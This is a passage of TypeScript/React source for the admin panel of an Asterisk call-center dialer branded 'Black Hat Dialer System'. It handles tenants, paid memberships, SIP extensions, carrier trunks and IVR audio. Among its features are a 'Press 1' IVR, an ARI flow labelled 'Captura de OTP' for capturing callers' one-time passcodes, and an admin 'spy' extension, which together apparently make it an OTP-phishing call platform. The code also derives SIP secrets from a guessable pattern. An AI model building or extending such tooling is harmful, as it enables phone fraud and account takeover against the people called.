      `Tenant: ${newTenant.code}\nExtensiones: ${newTenant.extensionStart}-${newTenant.extensionEnd}\nCarrier: ${newTenant.carrierId}\nCallerID: ${newTenant.outboundCallerId}`
    );
    if (resolvedMode !== 'none' && currentUser?.role === 'admin' && !currentUser?.tenantId) {
      try {
        await fetch('/api/tenants', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ tenants: updatedList, carriers, extensions }),
        });
        await fetch('/api/membership/activate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            targetType: 'tenant',
            targetId: newTenant.id,
            action: resolvedMode,
            notes:
              resolvedMode === 'demo_1_day'
                ? 'Demo de Prueba (1 Día) activado al crear Call Center'
                : 'Activación inicial de 1 Mes al crear Call Center',
          }),
        });
        await refreshMembershipOverview();
        showToast(
          resolvedMode === 'demo_1_day'
            ? `Call Center "${newTenant.name}" creado con Demo de Prueba (1 Día) activo.`
            : `Call Center "${newTenant.name}" creado con Membresía Principal de 1 Mes activa.`
        );
        return;
      } catch (_) {}
    }
    showToast(`Call Center "${newTenant.name}" creado con éxito.`);
  };

  const handleUpdateTenant = (updated: CallCenterTenant) => {
    setTenants((prev) => prev.map((t) => (t.id === updated.id ? updated : t)));
    addLog('SYSTEM', `Call Center "${updated.name}" actualizado (Saldo: $${updated.dollarBalance.toFixed(2)} USD).`);
    showToast(`Call Center "${updated.name}" actualizado.`);
  };

  const handleDeleteTenant = (id: string) => {
    const item = tenants.find((t) => t.id === id);
    setTenants((prev) => prev.filter((t) => t.id !== id));
    if (item) {
      addLog('SYSTEM', `Call Center "${item.name}" eliminado del sistema.`);
      showToast(`Call Center "${item.name}" eliminado.`);
    }
  };

  const handleRechargeTenant = (
    tenantId: string,
    amountDollars: number,
    paymentMethod: any,
    reference: string,
    notes?: string
  ) => {
    const tenant = tenants.find((t) => t.id === tenantId);
    if (!tenant) return;
    const rate = tenant.ratePerMinute > 0 ? tenant.ratePerMinute : 0.015;
    const minutesAdded = Math.floor(amountDollars / rate);
    addLog(
      'SYSTEM',
      `Recarga procesada para "${tenant.name}": +$${amountDollars.toFixed(2)} USD (+${minutesAdded.toLocaleString()} min) vía ${paymentMethod.toUpperCase()}`,
      `Ref: ${reference}\nNotas: ${notes || 'N/A'}`
    );
    showToast(`Recarga de $${amountDollars.toFixed(2)} USD aplicada a "${tenant.name}".`);
  };

  const handleAutoProvisionExtensions = (tenant: CallCenterTenant) => {
    const start = tenant.extensionStart;
    const end = tenant.extensionEnd;
    const newExts: PjsipExtension[] = [];

    for (let ext = start; ext <= end; ext++) {
      const extStr = ext.toString();
      const existing = extensions.find((e) => e.extension === extStr);
      if (!existing) {
        const activeSipPort = extensions.find((e) => Number(e.port) > 0)?.port || 47923;
        newExts.push({
          id: `ext-${extStr}`,
          extension: extStr,
          name: `${tenant.code} Agente ${ext - start + 1}`,
          secret: `Cc#${tenant.code}${ext}!`,
          context: tenant.dialplanContext,
          codecs: ['ulaw', 'alaw'],
          maxContacts: 1,
          transport: 'transport-udp',
          port: activeSipPort,
          status: 'unregistered',
          callerId: `"${tenant.code} Agente ${ext - start + 1}" <${extStr}>`,
          callerIdNum: extStr,
          callerIdName: `${tenant.code} Agente ${ext - start + 1}`,
          lastSeen: 'Listo para registrar',
        });
      }
    }

    if (newExts.length > 0) {
      setExtensions((prev) => [...prev, ...newExts]);
      addLog(
        'PJSIP',
        `Auto-aprovisionadas ${newExts.length} extensiones PJSIP para Grupo "${tenant.name}" (${start}-${end}) en contexto [${tenant.dialplanContext}]`,
        newExts.map((e) => `Ext ${e.extension}: ${e.name} (Context: ${e.context})`).join('\n')
      );
      showToast(`${newExts.length} extensiones generadas para "${tenant.name}".`);
      handleQuickSync([...extensions, ...newExts]);
    } else {
      showToast(`Todas las extensiones del rango ${start}-${end} ya existen en el sistema.`, 'info');
    }
  };

  const showToast = (text: string, type: 'success' | 'info' | 'error' = 'success') => {
    setToastMessage({ text, type });
    setTimeout(() => setToastMessage(null), 3500);
  };

  // =========================================================================
  // SISTEMA DE MEMBRESÍAS (1ER MES OBLIGATORIO -> EXTENSIONES SEMANALES)
  // =========================================================================
  const [membershipSettings, setMembershipSettings] = useState<MembershipSettings>({
    enforceMembershipSystem: true,
    initialMonthDays: 30,
    demoDays: 1,
    weekDays: 7,
    initialMonthPriceUsd: 150,
    weeklyPriceUsd: 45,
    allowSelfRenewalFromBalance: false,
  });
  const [myMembership, setMyMembership] = useState<EffectiveMembershipStatus | null>(null);
  const [membershipRequests, setMembershipRequests] = useState<MembershipRenewalRequest[]>([]);

  const isMembershipLocked = Boolean(
    isAuthenticated &&
    myMembership &&
    !myMembership.exempt &&
    !myMembership.isActive
  );

  const pendingMembershipRequestsCount =
    currentUser?.role === 'admin' && !currentUser?.tenantId
      ? membershipRequests.filter((r) => r.status === 'pending').length
      : 0;

  const refreshMembershipOverview = useCallback(async () => {
    if (!getAuthToken()) return;
    try {
      const res = await fetch('/api/membership/overview');
      if (!res.ok) return;
      const data = await res.json();
      if (!data?.success) return;

      if (data.settings) setMembershipSettings(data.settings);
      if (data.myMembership) setMyMembership(data.myMembership);
      if (Array.isArray(data.requests)) {
        setMembershipRequests(data.requests);
      } else if (Array.isArray(data.myRequests)) {
        setMembershipRequests(data.myRequests);
      }

      if (Array.isArray(data.tenants)) {
        const memMap = new Map<string, any>(
          data.tenants.map((t: any) => [t.id, { membership: t.membership, effectiveMembership: t.effectiveMembership }])
        );
        setTenants((prev) => {
          let changed = false;
          const next = prev.map((t) => {
            const m = memMap.get(t.id);
            if (!m) return t;
            const prevSig = `${t.effectiveMembership?.status || ''}:${t.effectiveMembership?.expiresAt || ''}:${t.membership?.initialMonthActivated ? 1 : 0}`;
            const nextSig = `${m.effectiveMembership?.status || ''}:${m.effectiveMembership?.expiresAt || ''}:${m.membership?.initialMonthActivated ? 1 : 0}`;
            if (prevSig === nextSig) return t;
            changed = true;
            return { ...t, membership: m.membership, effectiveMembership: m.effectiveMembership };
          });
          if (!changed) return prev;
          lastSavedTenantsJsonRef.current = serializeTenantsCore(next);
          return next;
        });
      }

      if (Array.isArray(data.users)) {
        const uMap = new Map<string, any>(data.users.map((u: any) => [u.id, u]));
        setUsers((prev) => {
          let changed = false;
          const next = prev.map((u) => {
            const srv = uMap.get(u.id);
            if (!srv) return u;
            const prevSig = `${u.effectiveMembership?.status || ''}:${u.effectiveMembership?.expiresAt || ''}:${u.membership?.initialMonthActivated ? 1 : 0}`;
            const nextSig = `${srv.effectiveMembership?.status || ''}:${srv.effectiveMembership?.expiresAt || ''}:${srv.membership?.initialMonthActivated ? 1 : 0}`;
            if (prevSig === nextSig) return u;
            changed = true;
            return { ...u, membership: srv.membership, effectiveMembership: srv.effectiveMembership };
          });
          return changed ? next : prev;
        });
      } else if (data.myMembership) {
        setUsers((prev) =>
          prev.map((u) => {
            if (u.id !== currentUserId) return u;
            const prevSig = `${u.effectiveMembership?.status || ''}:${u.effectiveMembership?.expiresAt || ''}`;
            const nextSig = `${data.myMembership.status || ''}:${data.myMembership.expiresAt || ''}`;
            if (prevSig === nextSig) return u;
            return { ...u, effectiveMembership: data.myMembership };
          })
        );
      }
    } catch (_) {}
  }, [currentUserId]);

  useEffect(() => {
    if (!isAuthenticated) return;
    refreshMembershipOverview();
    const interval = setInterval(() => {
      if (typeof document !== 'undefined' && document.hidden) return;
      refreshMembershipOverview();
    }, 30000);
    const onMembershipBlocked = (ev: Event) => {
      const detail = (ev as CustomEvent)?.detail;
      if (detail?.error) {
        showToast(detail.error, 'error');
      } else {
        showToast('Tu membresía no está activa. Activa o renueva tu plan para continuar.', 'error');
      }
      refreshMembershipOverview();
      setActiveTab('membership');
    };
    window.addEventListener('ast:membership-blocked', onMembershipBlocked as EventListener);
    return () => {
      clearInterval(interval);
      window.removeEventListener('ast:membership-blocked', onMembershipBlocked as EventListener);
    };
  }, [isAuthenticated, refreshMembershipOverview]);

  useEffect(() => {
    if (isMembershipLocked && activeTab !== 'membership') {
      setActiveTab('membership');
    }
  }, [isMembershipLocked, activeTab]);

  const addLog = (
    type: SyncLogEntry['type'],
    message: string,
    payload?: string,
    status: 'success' | 'pending' | 'failed' = 'success'
  ) => {
    const newLog: SyncLogEntry = {
      id: `log-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
      timestamp: new Date().toLocaleTimeString(),
      type,
      message,
      payload,
      status,
    };
    setLogs((prev) => [newLog, ...prev]);
  };

  // =========================================================================
  // AMI CLIENT-SIDE RETRY CONTROLLER WITH EXPONENTIAL BACKOFF
  // =========================================================================
  interface AmiClientBackoffState {
    consecutiveFailures: number;
    baseDelayMs: number;
    maxDelayMs: number;
    currentDelayMs: number;
    nextAllowedTime: number;
    isBackoffActive: boolean;
    lastFailureTime: number;
    lastSuccessTime: number;
    lastError: string;
  }

  const [amiBackoff, setAmiBackoff] = useState<AmiClientBackoffState>({
    consecutiveFailures: 0,
    baseDelayMs: 1000,
    maxDelayMs: 32000,
    currentDelayMs: 1000,
    nextAllowedTime: 0,
    isBackoffActive: false,
    lastFailureTime: 0,
    lastSuccessTime: 0,
    lastError: '',
  });

  const amiBackoffRef = useRef(amiBackoff);
  useEffect(() => {
    amiBackoffRef.current = amiBackoff;
  }, [amiBackoff]);

  // Exponential backoff calculator with jitter: min(32s, 1s * 2^(failures-1)) + jitter
  const calculateAmiBackoffDelay = (failures: number): number => {
    const base = 1000;
    const max = 32000;
    const exponent = Math.min(failures - 1, 5);
    const expDelay = Math.min(max, base * Math.pow(2, exponent));
    const jitter = Math.floor(Math.random() * (expDelay * 0.15));
    return expDelay + jitter;
  };

  const recordAmiSuccessClient = () => {
    if (amiBackoffRef.current.consecutiveFailures > 0 || amiBackoffRef.current.isBackoffActive) {
      addLog(
        'AMI',
        `[AMI RECONECTADO] Conexión establecida con éxito con Asterisk :5038 tras ${amiBackoffRef.current.consecutiveFailures} reintentos. Backoff finalizado.`,
        undefined,
        'success'
      );
    }
    setAmiBackoff({
      consecutiveFailures: 0,
      baseDelayMs: 1000,
      maxDelayMs: 32000,
      currentDelayMs: 1000,
      nextAllowedTime: 0,
      isBackoffActive: false,
      lastFailureTime: 0,
      lastSuccessTime: Date.now(),
      lastError: '',
    });
    setConnectionSettings((prev) => (prev.status === 'connected' ? prev : { ...prev, status: 'connected' }));
  };

  const recordAmiFailureClient = (errMsg: string) => {
    const now = Date.now();
    const newFailures = amiBackoffRef.current.consecutiveFailures + 1;
    const delay = calculateAmiBackoffDelay(newFailures);
    const nextTime = now + delay;
    const cooldownSec = Math.round(delay / 1000);

    setAmiBackoff({
      consecutiveFailures: newFailures,
      baseDelayMs: 1000,
      maxDelayMs: 32000,
      currentDelayMs: delay,
      nextAllowedTime: nextTime,
      isBackoffActive: true,
      lastFailureTime: now,
      lastSuccessTime: amiBackoffRef.current.lastSuccessTime,
      lastError: errMsg,
    });
    setConnectionSettings((prev) => (prev.status === 'error' ? prev : { ...prev, status: 'error' }));

    addLog(
      'AMI',
      `[AMI BACKOFF ACTIVADO] Intento fallido #${newFailures} (${errMsg}). Reconexión en pausa por ${cooldownSec}s para evitar bucles.`,
      `Estrategia: min(32s, 1s * 2^${Math.min(newFailures - 1, 5)}) + jitter => ${delay}ms\nSiguiente reintento permitido: ${new Date(nextTime).toLocaleTimeString()}`,
      'failed'
    );
    showToast(`Asterisk no accesible. Cooldown AMI: ${cooldownSec}s`, 'error');
  };

  const handleResetAmiBackoff = async () => {
    setAmiBackoff({
      consecutiveFailures: 0,
      baseDelayMs: 1000,
      maxDelayMs: 32000,
      currentDelayMs: 1000,
      nextAllowedTime: 0,
      isBackoffActive: false,
      lastFailureTime: 0,
      lastSuccessTime: Date.now(),
      lastError: '',
    });
    setConnectionSettings((prev) => ({ ...prev, status: 'connected' }));
    try {
      await fetch('/api/asterisk/ami/reset-backoff', { method: 'POST' });
    } catch (_) {}
    addLog('AMI', '[AMI BACKOFF RESET] Circuito restablecido manualmente por el operador.', undefined, 'success');
    showToast('Backoff AMI restablecido');
  };

  // Full Hot Reload Execution with Backoff Check
  const handleQuickSync = async (extsToSync = extensions, carriersToSync = carriers, forceSync = false) => {
    const now = Date.now();
    const state = amiBackoffRef.current;

    // Check if AMI circuit is currently in exponential backoff (bypass if user explicitly mutated carriers/config)
    if (!forceSync && state.isBackoffActive && now < state.nextAllowedTime) {
      const remainingSec = Math.max(1, Math.ceil((state.nextAllowedTime - now) / 1000));
      addLog(
        'AMI',
        `[SYNC PAUSADO] Sincronización evitada para prevenir saturación de Asterisk (${remainingSec}s restantes).`,
        `Asterisk no está accesible actualmente. Los cambios locales se mantienen protegidos.`,
        'pending'
      );
      showToast(`Sincronización en pausa (${remainingSec}s restantes)`, 'info');
      return;
    }

    setIsSyncing(true);
    addLog(
      'AMI',
      `Sincronizando ${extsToSync.length} extensiones y ${carriersToSync.length} troncales con Asterisk (/etc/asterisk/pjsip.conf) vía AMI...`,
      'POST /api/asterisk/sync/extensions'
    );

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 6000);

      const res = await fetch('/api/asterisk/sync/extensions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          extensions: extsToSync,
          carriers: carriersToSync,
          users: users,
          tenants: tenants,
        }),
        signal: controller.signal,
      });
      clearTimeout(timeoutId);

      if (res.ok) {
        const data = await res.json();
        recordAmiSuccessClient();
        addLog(
          'AMI',
          `Black Hat Dialer System Actualizado: ${data.message || 'Recarga en caliente exitosa'}`,
          data.amiOutput || `Module 'res_pjsip.so' reloaded with ${extsToSync.length} endpoints.`
        );
        showToast(`Black Hat Dialer System sincronizado: ${extsToSync.length} extensiones y ${carriersToSync.length} troncales`);
      } else {
        throw new Error('Servidor Asterisk no disponible');
      }
    } catch (err: any) {
      recordAmiFailureClient(err.message || 'Fallo de sincronización AMI');
      addLog(
        'AMI',
        'PJSIP reloaded locally (offline cache active).',
        `Output: Cambios guardados en memoria local. Cooldown aplicado para evitar saturación de red.`
      );
      showToast('Sincronización local completada (Asterisk offline)');
    } finally {
      setIsSyncing(false);
    }
  };

  // Extension Handlers (Enforces 1001+)
  const handleAddExtension = (newExt: PjsipExtension) => {
    const updated = [...extensions, newExt];
    setExtensions(updated);
    try {
      localStorage.setItem('ast20_extensions', JSON.stringify(updated));
    } catch (e) {}
    addLog(
      'PJSIP',
      `Nueva extensión PJSIP creada: ${newExt.extension} (${newExt.name})`,
      `Endpoint: [${newExt.extension}]\nAuth: [${newExt.extension}-auth]\nAor: [${newExt.extension}]`
    );
    handleQuickSync(updated);
  };

  const handleUpdateExtension = (updatedExt: PjsipExtension) => {
    const updated = extensions.map((e) => (e.id === updatedExt.id ? updatedExt : e));
    setExtensions(updated);
    try {
      localStorage.setItem('ast20_extensions', JSON.stringify(updated));
    } catch (e) {}
    addLog('PJSIP', `Extensión PJSIP modificada: ${updatedExt.extension}`);
    handleQuickSync(updated);
  };

  const handleDeleteExtension = (id: string) => {
    const ext = extensions.find((e) => e.id === id);
    const updated = extensions.filter((e) => e.id !== id);
    setExtensions(updated);
    try {
      localStorage.setItem('ast20_extensions', JSON.stringify(updated));
    } catch (e) {}
    if (ext) {
      addLog('PJSIP', `Extensión PJSIP eliminada del sistema: ${ext.extension}`);
      handleQuickSync(updated);
    }
  };

  const handleResetDefaultExtensions = () => {
    setExtensions(initialExtensions);
    try {
      localStorage.setItem('ast20_extensions', JSON.stringify(initialExtensions));
    } catch (e) {}
    showToast('Extensiones oficiales (1000 Espía, 1001, 1002, 1003) restauradas con éxito.', 'success');
    addLog('PJSIP', 'Cargadas extensiones 1000 (Espía Admin), 1001, 1002 y 1003 en memoria y sincronizadas.');
    handleQuickSync(initialExtensions);
  };

  const handleSimulateQualify = (extNumber: string) => {
    addLog(
      'AMI',
      `Enviando SIP OPTIONS Qualify a extensión ${extNumber}`,
      `Action: Command\nCommand: pjsip show endpoint ${extNumber}`
    );
    setTimeout(() => {
      addLog(
        'AMI',
        `Respuesta Qualify de extensión ${extNumber}: Reachable (RTT: 12.4ms)`
      );
      showToast(`Extensión ${extNumber}: Reachable (12ms)`);
    }, 400);
  };

  // Carrier Handlers
  const handleAddCarrier = (newCarrier: CarrierTrunk) => {
    const updated = [...carriers, newCarrier];
    setCarriers(updated);
    try {
      localStorage.setItem('ast20_carriers', JSON.stringify(updated));
    } catch (_) {}
    addLog(
      'PJSIP',
      `Nuevo Carrier SIP agregado: ${newCarrier.name} (${newCarrier.host}:${newCarrier.port})`,
      `AuthType: ${newCarrier.authType}\nInboundContext: ${newCarrier.inboundContext}\nCodecs: ${newCarrier.codecs.join(',')}`
    );
    handleQuickSync(extensions, updated, true);
  };

  const handleUpdateCarrier = (updatedCarrier: CarrierTrunk) => {
    const updated = carriers.map((c) => (c.id === updatedCarrier.id ? updatedCarrier : c));
    setCarriers(updated);
    try {
      localStorage.setItem('ast20_carriers', JSON.stringify(updated));
    } catch (_) {}
    addLog('PJSIP', `Carrier SIP actualizado: ${updatedCarrier.name} (${updatedCarrier.host}:${updatedCarrier.port})`);
    handleQuickSync(extensions, updated, true);
  };

  const handleDeleteCarrier = (id: string) => {
    const c = carriers.find((item) => item.id === id);
    const updated = carriers.filter((item) => item.id !== id);
    setCarriers(updated);
    try {
      localStorage.setItem('ast20_carriers', JSON.stringify(updated));
    } catch (_) {}
    if (c) {
      addLog('PJSIP', `Carrier SIP eliminado: ${c.name}`);
      handleQuickSync(extensions, updated, true);
    }
  };

  const handleReorderCarriers = (reordered: CarrierTrunk[]) => {
    setCarriers(reordered);
    try {
      localStorage.setItem('ast20_carriers', JSON.stringify(reordered));
    } catch (_) {}
    addLog('PJSIP', `Prioridad de troncales actualizada: ${reordered.map(c => c.name).join(' -> ')}`);
    handleQuickSync(extensions, reordered, true);
  };

  const handlePingCarrier = async (id: string) => {
    const c = carriers.find((item) => item.id === id);
    if (!c) return;
    addLog('AMI', `Verificando conectividad SIP y registro de Carrier ${c.name} (${c.host}:${c.port})...`);
    try {
      const res = await fetch('/api/asterisk/carriers/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: c.name,
          host: c.host,
          port: c.port,
          authType: c.authType,
        }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        const latency = typeof data.latencyMs === 'number' ? data.latencyMs : undefined;
        const isOk = Boolean(data.reachable || data.registered);
        setCarriers((prev) =>
          prev.map((item) =>
            item.id === id
              ? {
                  ...item,
                  latencyMs: latency ?? item.latencyMs,
                  status: item.enabled === false ? 'disabled' : (isOk ? 'reachable' : 'unreachable'),
                }
              : item
          )
        );
        const regText = c.authType === 'registration'
          ? ` | Registro: ${data.registrationState || 'Verificado'}`
          : ' | Peering IP';
        const latText = latency !== undefined ? ` (${latency}ms)` : '';
        addLog('AMI', `Carrier ${c.name} respuesta: ${isOk ? 'Reachable' : 'Sin respuesta'}${latText}${regText}`);
        showToast(
          isOk
            ? `Carrier [${c.name}] activo${latText}${regText}`
            : `Carrier [${c.name}] sin respuesta en ${c.host}:${c.port}`,
          isOk ? 'success' : 'error'
        );
      } else {
        throw new Error(data.error || 'No se pudo verificar el carrier');
      }
    } catch (err: any) {
      addLog('AMI', `Error verificando Carrier ${c.name}: ${err.message}`, undefined, 'failed');
      showToast(`Error probando ${c.name}: ${err.message}`, 'error');
    }
  };

  const handleToggleCarrier = (id: string) => {
    const c = carriers.find((item) => item.id === id);
    if (!c) return;
    const isCurrentlyEnabled = c.enabled !== false && c.status !== 'disabled';
    const newStatus = isCurrentlyEnabled ? 'disabled' : 'reachable';
    const newEnabled = !isCurrentlyEnabled;

    const updated = carriers.map((item) => {
      if (item.id === id) {
        return {
          ...item,
          enabled: newEnabled,
          status: newStatus as any,
        };
      }
      return item;
    });

    setCarriers(updated);
    try {
      localStorage.setItem('ast20_carriers', JSON.stringify(updated));
    } catch (_) {}
    addLog(
      'PJSIP',
      newEnabled ? `Carrier SIP Habilitado: ${c.name}` : `Carrier SIP Deshabilitado: ${c.name}`,
      `Host: ${c.host}:${c.port} | Estado: ${newEnabled ? 'ACTIVO (Se conecta)' : 'SUSPENDIDO (No conecta)'}`
    );
    // Sincronizar inmediatamente con Asterisk en 1 clic
    handleQuickSync(extensions, updated, true);
    showToast(newEnabled ? `Troncal [${c.name}] HABILITADA y conectando` : `Troncal [${c.name}] DESHABILITADA (Conexión suspendida)`, 'info');
  };

  // Audio Handlers
  const handleAddAudio = async (newAudio: AudioPrompt) => {
    setAudios((prev) => [newAudio, ...prev]);
    addLog(
      'SYSTEM',
      `[AUDIO] Registrando archivo de audio: ${newAudio.fileName}`,
      `Path: /var/lib/asterisk/sounds/${newAudio.asteriskPath}.wav\nFormato: ${newAudio.sampleRate}\nDuración: ${newAudio.durationSec}s`
    );
    showToast(`Audio "${newAudio.name}" registrado en la audioteca.`);

    // Automatically sync physical audio file to Asterisk filesystem if dataUrl is available
    if (newAudio.dataUrl) {
      try {
        const res = await fetch('/api/asterisk/audio/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: newAudio.name,
            fileName: newAudio.fileName,
            category: newAudio.category,
            dataUrl: newAudio.dataUrl,
          }),
        });
        const data = await res.json();
        if (data.success) {
          addLog(
            'SYSTEM',
            `[AUDIO-SYNC] Archivo guardado físicamente en Asterisk: ${data.asteriskPath}`,
            `Ruta: /var/lib/asterisk/sounds/${data.asteriskPath}.wav\nFormato optimizado: ${data.format || '8kHz Mono'}`
          );
        }
      } catch (err) {
        console.warn('Could not sync audio physically to Asterisk:', err);
      }
    }
  };

  const handleDeleteAudio = async (id: string) => {
    const audio = audios.find((a) => a.id === id);
    setAudios((prev) => prev.filter((a) => a.id !== id));
    if (audio) {
      addLog('SYSTEM', `[AUDIO] Archivo de audio eliminado: ${audio.fileName}`);
      showToast(`Audio "${audio.name}" eliminado.`);
      try {
        await fetch('/api/asterisk/audio/delete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            asteriskPath: audio.asteriskPath,
            fileName: audio.fileName,
          }),
        });
      } catch (e) {}
    }
  };

  const handleAssignToPress1 = (audioId: string) => {
    setPress1Config((prev) => ({ ...prev, welcomeAudioId: audioId }));
    const audio = audios.find((a) => a.id === audioId);
    showToast(`Audio "${audio?.name || 'seleccionado'}" asignado a Bienvenida Press 1.`);
    addLog(
      'AMI',
      `IVR Press 1 actualizado con audio: ${audio?.fileName}`,
      `Dialplan: Background(${audio?.asteriskPath})`
    );
    if (audio?.asteriskPath) {
      fetch('/api/asterisk/audio/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: 'press1_welcome', asteriskPath: audio.asteriskPath }),
      }).catch(() => {});
    }
  };

  const handleAssignToAgentTransfer = (audioId: string) => {
    const audio = audios.find((a) => a.id === audioId);
    if (!audio) return;
    showToast(`Audio "${audio.name}" asignado a Transferencia a Asesor (Opción 1).`);
    addLog(
      'AMI',
      `Audio de Transferencia a Asesor actualizado: ${audio.fileName}`,
      `AstDB: database put ivr_vars default_agent "${audio.asteriskPath}" (Playback al presionar 1)`
    );
    fetch('/api/asterisk/audio/assign', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role: 'agent_transfer', asteriskPath: audio.asteriskPath }),
    }).catch(() => {});
  };

  const handleAssignToOtp = (audioId: string) => {
    setOtpConfig((prev) => ({ ...prev, welcomeAudioId: audioId }));
    const audio = audios.find((a) => a.id === audioId);
    showToast(`Audio "${audio?.name || 'seleccionado'}" asignado a Captura de OTP.`);
    addLog(
      'ARI',
      `Stasis OTP actualizado con audio de instrucción: ${audio?.fileName}`,
      `ARI Stasis Playback: ${audio?.asteriskPath}`
    );
  };

  // User Handlers with Auto-provisioning in Asterisk 20 PJSIP
  const handleAddUser = (
    newUser: SystemUser,
    activationMode?: 'initial_month' | 'demo_1_day' | 'none' | boolean
  ) => {
    const resolvedActivationMode: 'initial_month' | 'demo_1_day' | 'none' =
      activationMode === true
        ? 'initial_month'
        : activationMode === 'initial_month' || activationMode === 'demo_1_day'
        ? activationMode
        : 'none';

    const updatedUsersList = [...users, newUser];
    setUsers(updatedUsersList);
    const cleanUser = String(newUser.username || newUser.email.split('@')[0]).trim().toLowerCase().replace(/[^a-z0-9_\-]/g, '');
    
    if (cleanUser && newUser.password) {
      setExtensions((prevExts) => {
        const extIdx = prevExts.findIndex((e) => e.extension.toLowerCase() === cleanUser);
        const newExtObj: PjsipExtension = {
          id: `ext-${cleanUser}`,
          extension: cleanUser,
          name: newUser.name,
          secret: newUser.password,
          context: 'from-internal',
          transport: 'transport-udp',
          port: 47923,
          maxContacts: 10,
          codecs: ['ulaw', 'alaw'],
          status: 'registered',
          callerId: `"${newUser.name}" <${(newUser.assignedExtensions && newUser.assignedExtensions[0]) || cleanUser}>`,
          callerIdNum: (newUser.assignedExtensions && newUser.assignedExtensions[0]) || cleanUser,
          callerIdName: newUser.name,
        };
        let updatedExts = [...prevExts];
        if (extIdx >= 0) {
          updatedExts[extIdx] = { ...updatedExts[extIdx], ...newExtObj };
        } else {
          updatedExts.push(newExtObj);
        }
        if (Array.isArray(newUser.assignedExtensions)) {
          updatedExts = updatedExts.map((e) => {
            if (newUser.assignedExtensions.includes(e.extension)) {
              return { ...e, secret: newUser.password };
            }
            return e;
          });
        }
        return updatedExts;
      });

      // Synchronize immediately to /etc/asterisk/pjsip.conf, AstDB and hot reload Asterisk
      fetch('/api/users/sync-sip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user: newUser,
          initialActivationMode: resolvedActivationMode,
          activateInitialMonth: resolvedActivationMode === 'initial_month',
        }),
      })
        .then(() => refreshMembershipOverview())
        .catch(() => {});
    }

    addLog(
      'SYSTEM',
      `[USUARIOS] Nuevo usuario creado y registrado en Asterisk PJSIP: ${newUser.name} (${cleanUser})`,
      `Contraseña sincronizada para MicroSIP puerto 47923`
    );
    showToast(
      resolvedActivationMode === 'demo_1_day'
        ? `Usuario ${newUser.name} creado con Demo de 1 Día activo en Asterisk 20.`
        : `Usuario ${newUser.name} creado y registrado en Asterisk 20.`
    );
  };

  const handleUpdateUser = (updatedUser: SystemUser) => {
    const updatedUsersList = users.map((u) => (u.id === updatedUser.id ? updatedUser : u));
    setUsers(updatedUsersList);
    const cleanUser = String(updatedUser.username || updatedUser.email.split('@')[0]).trim().toLowerCase().replace(/[^a-z0-9_\-]/g, '');

    if (cleanUser && updatedUser.password) {
      setExtensions((prevExts) => {
        const updatedExts = prevExts.map((e) => {
          if (e.extension.toLowerCase() === cleanUser) {
            return { ...e, secret: updatedUser.password, name: updatedUser.name };
          }
          if (Array.isArray(updatedUser.assignedExtensions) && updatedUser.assignedExtensions.includes(e.extension)) {
            return { ...e, secret: updatedUser.password };
          }
          return e;
        });
        return updatedExts;
      });
    }

    if (cleanUser) {
      fetch('/api/users/sync-sip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user: updatedUser }),
      }).catch(() => {});
    }

    addLog('SYSTEM', `[USUARIOS] Permisos y credenciales PJSIP actualizadas para: ${updatedUser.name}`);
    showToast(`Usuario ${updatedUser.name} actualizado en Asterisk.`);
  };

  const handleDeleteUser = (userId: string) => {
    const user = users.find((u) => u.id === userId);
    setUsers((prev) => prev.filter((u) => u.id !== userId));
    if (user) {
      addLog('SYSTEM', `[USUARIOS] Usuario eliminado: ${user.name}`);
      showToast(`Usuario ${user.name} eliminado.`);
    }
  };

  const handleSwitchUser = async (userId: string) => {
    setCurrentUserId(userId);
    const user = users.find((u) => u.id === userId);
    if (user) {
      setActiveTab(getDefaultTabForUser(user));
      showToast(`Sesión cambiada a: ${user.name} (${user.role})`);
      addLog('SYSTEM', `[SESIÓN] Operador activo cambiado a: ${user.name}`);
      try {
        localStorage.setItem('ast20_current_user_id', user.id);
      } catch (e) {}
      await fetchUserState(user.id, user.username);
    }
  };

  // Custom AMI Command Runner with Exponential Backoff and Controlled Retry Limit
  const handleExecuteAmiCommand = async (command: string, retryAttempt = 0) => {
    const now = Date.now();
    const state = amiBackoffRef.current;

    // Check Circuit Breaker / Cooldown Guard
    if (state.isBackoffActive && now < state.nextAllowedTime && retryAttempt === 0) {
      const remainingSec = Math.max(1, Math.ceil((state.nextAllowedTime - now) / 1000));
      addLog(
        'AMI',
        `[REINTENTO LIMITADO] Comando en pausa: servidor Asterisk no accesible. Cooldown activo (${remainingSec}s restantes).`,
        `Error previo: ${state.lastError || 'Conexión rechazada'}\nPara reintentar ahora, haz clic en "Restablecer Backoff AMI".`,
        'pending'
      );
      showToast(`AMI en espera de reconexión (${remainingSec}s)`, 'info');
      return;
    }

    addLog('AMI', retryAttempt > 0 ? `[REINTENTO #${retryAttempt}] > ${command}` : `> ${command}`);

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 4000);

      const res = await fetch('/api/asterisk/ami/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: connectionSettings.amiHost || '127.0.0.1',
          port: connectionSettings.amiPort || 5038,
          user: connectionSettings.amiUser || undefined,
          secret: connectionSettings.amiSecret || undefined,
          command,
        }),
        signal: controller.signal,
      });
      clearTimeout(timeoutId);

      const data = await res.json();
      if (res.ok && data.success && data.output && !data.output.startsWith('AMI Error') && !data.output.startsWith('AMI Backoff')) {
        recordAmiSuccessClient();
        addLog('AMI', `Response: Success (AMI :5038)`, data.output, 'success');
        return;
      } else {
        const errorMsg = data.error || (data.output?.includes('Backoff activo') ? data.output : 'Error de respuesta en Asterisk AMI');
        recordAmiFailureClient(errorMsg);

